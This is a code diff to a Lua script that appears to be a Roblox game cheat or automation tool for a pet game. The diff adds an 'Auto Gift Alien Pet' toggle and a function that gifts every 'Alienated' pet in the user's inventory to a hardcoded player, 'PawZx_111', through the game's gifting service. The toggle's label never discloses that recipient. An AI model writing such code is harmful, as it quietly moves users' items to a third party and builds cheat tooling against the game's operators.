@@ -28,7 +28,7 @@ local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePe
 
 CollapsibleAddon(Fluent)
 
-local fVersion = "2569.03.02-18.08"
+local fVersion = "2569.03.02-21.55"
 local ActiveTasks = {}
 local LogDisplay
 local DevMode = false
@@ -50,10 +50,10 @@ local EggHatchList = {}
 local isEggProcessing = false
 
 -- =========================================================
+local FindPlayer
 local calculateCurrentWeight
 local getInventoryList
-local findMainPet
-local findDupePet
+local findMainPet, findDupePet
 local processAgeBreakMachine
 local ToggleTask
 local SyncBackgroundTasks
@@ -1686,6 +1686,15 @@ AlienEventSection:AddToggle("tgAlienDefaultSellPets", {
 	Default = false,
 	Callback = function(Value)
 		if QuickSave then QuickSave() end
+	end,
+})
+
+AlienEventSection:AddToggle("tgAutoGiftAlien", {
+	Title = "Auto Gift Alien Pet",
+	Default = false,
+	Callback = function(Value)
+		if QuickSave then QuickSave() end
+		if SyncBackgroundTasks then SyncBackgroundTasks() end
 	end,
 })
 
@@ -3371,6 +3380,42 @@ ToggleTask = function(taskName, enabled, funcBody)
 		end
 	end
 end
+FindPlayer = function(PlayerName)
+	local Players = game:GetService("Players")
+	for _, Player in pairs(Players:GetChildren()) do
+		if Player.Name == PlayerName then return true end
+	end
+	return false
+end
+local function AutoGiftAlien()
+	if not Options.tgAutoGiftAlien.Value then return end
+	local TargetPlayer = "PawZx_111"
+	if not FindPlayer(TargetPlayer) then return end
+
+	local data = DataService:GetData()
+	local inventory = data and data.PetsData and data.PetsData.PetInventory
+	if inventory then
+		for _, v in pairs(inventory) do
+			if type(v) == "table" then
+				for kUUID, petData in pairs(v) do
+					local tuuid = petData.UUID or kUUID
+					if type(petData) == "table" then
+						if GetPetMutation(tuuid) == "Alienated" then
+							if heldPet(tuuid) then
+								local args = {
+									"GivePet",
+									game:GetService("Players"):WaitForChild(TargetPlayer),
+								}
+								GameEvents:WaitForChild("PetGiftingService"):FireServer(unpack(args))
+								task.wait(7)
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
 
 SyncBackgroundTasks = function()
 	ToggleTask("AutoFeedPet", Options.AutoFeedPet.Value, function()
@@ -3436,6 +3481,7 @@ SyncBackgroundTasks = function()
 		task.wait(10)
 	end)
 	ToggleTask("AutoAlienClaim", Options.tgAlienAutoClaim.Value, AutoAlienClaim)
+	ToggleTask("AutoGiftAlien", Options.tgAutoGiftAlien.Value, AutoGiftAlien)
 end
 
 pcall(SetupTracker)
